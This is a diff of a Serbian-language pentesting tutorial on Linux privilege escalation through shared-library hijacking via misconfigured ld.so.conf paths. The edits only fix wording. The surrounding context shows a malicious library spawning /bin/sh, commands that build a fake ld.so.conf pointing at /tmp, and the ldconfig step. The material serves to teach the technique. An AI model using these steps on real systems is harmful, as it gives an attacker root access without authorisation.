@@ -69,7 +69,7 @@ puts("Hi");
 
 ### Proverite okruženje
 
-Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da možete **izvršiti** binarnu datoteku.
+Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete **izvršiti** binarnu datoteku.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -103,7 +103,7 @@ printf("I'm the bad library\n");
 system("/bin/sh",NULL,NULL);
 }
 ```
-Sada kada smo **napravili zlu libcustom biblioteku unutar pogrešno konfigurisane** putanje, treba da sačekamo na **ponovno pokretanje** ili da korisnik root izvrši **`ldconfig`** (_u slučaju da možete da izvršite ovu binarnu datoteku kao **sudo** ili ima **suid bit**, moći ćete da je izvršite sami_).
+Sada kada smo **napravili zlu libcustom biblioteku unutar pogrešno konfigurisane** putanje, treba da sačekamo na **ponovno pokretanje** ili da root korisnik izvrši **`ldconfig`** (_u slučaju da možete da izvršite ovu binarnu datoteku kao **sudo** ili da ima **suid bit**, moći ćete da je izvršite sami_).
 
 Kada se to dogodi, **ponovo proverite** odakle `sharevuln` izvršna datoteka učitava `libcustom.so` biblioteku:
 ```c
@@ -141,7 +141,7 @@ echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
 Sada, kao što je naznačeno u **prethodnom eksploitu**, **napravite zlu biblioteku unutar `/tmp`**.\
-I konačno, učitajte putanju i proverite odakle se binarni fajl učitava biblioteku:
+I konačno, učitajmo putanju i proverimo odakle se binarni fajl učitava biblioteku:
 ```bash
 ldconfig -f fake.ld.so.conf
 
